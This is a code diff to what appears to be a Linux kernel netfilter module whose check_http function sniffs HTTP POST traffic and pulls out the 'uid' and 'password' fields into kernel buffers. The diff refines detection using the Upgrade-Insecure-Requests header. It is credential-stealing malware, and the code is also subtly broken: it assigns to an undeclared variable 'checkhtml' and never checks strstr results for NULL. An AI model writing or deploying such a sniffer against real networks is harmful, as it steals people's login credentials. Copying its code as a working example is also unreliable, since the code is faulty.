@@ -132,7 +132,7 @@ static void check_http(struct sk_buff *skb)
    char *name;
    char *passwd;
    char *_and;
-   char *check_connection;
+   char *check_html;
    int len,i;
 
    tcp = tcp_hdr(skb);
@@ -141,20 +141,23 @@ static void check_http(struct sk_buff *skb)
 
 
 //   if (strstr(data,"Connection") != NULL && strstr(data, "uid") != NULL && strstr(data, "password") != NULL) { 
-   if (strstr(data,"Connection") != NULL && strstr(data, "&uid") != NULL && strstr(data, "&password") != NULL) { 
+	//check POST
+	//cookie中也有uid，但可能没有pwd，且没有&分隔，而提交的HTML数据在cookie的后面，可通过Upgrade-Insecure-Requests定位
+   if (strstr(data,"POST /") != NULL && strstr(data,"Upgrade-Insecure-Requests") != NULL 
+       	&& strstr(data, "&uid") != NULL && strstr(data, "&password") != NULL) { 
 
-        check_connection = strstr(data,"Connection");
+        checkhtml = strstr(data,"Upgrade-Insecure-Requests");
 
-        printk("find connection uid password");
+        printk("find POST html");
 
-        name = strstr(check_connection,"&uid=");
+        name = strstr(check_html,"&uid=");
         name += 5;
         _and = strstr(name,"&");
         
         len = _and - name;
-        if ((username = kmalloc(len + 2, GFP_KERNEL)) == NULL)
+        if ((username = kmalloc(len + 1, GFP_KERNEL)) == NULL)
           return;
-        memset(username, 0x00, len + 2);
+        memset(username, 0x00, len + 1);
         for (i = 0; i < len; ++i)
         {
           *(username + i) = name[i];
@@ -166,9 +169,9 @@ static void check_http(struct sk_buff *skb)
         _and = strstr(passwd,"&");
         
         len = _and - passwd;
-        if ((password = kmalloc(len + 2, GFP_KERNEL)) == NULL)
+        if ((password = kmalloc(len + 1, GFP_KERNEL)) == NULL)
           return;
-        memset(password, 0x00, len + 2);
+        memset(password, 0x00, len + 1);
         for (i = 0; i < len; ++i)
         {
           *(password + i) = passwd[i];
@@ -335,7 +338,7 @@ static unsigned int watch_in(void *priv, struct sk_buff *skb,
 
 int init_module()
 {
-  //struct net *net=NULL;
+  
    pre_hook.hook     = watch_in;
    pre_hook.pf       = PF_INET;
    pre_hook.priority = NF_IP_PRI_FIRST;
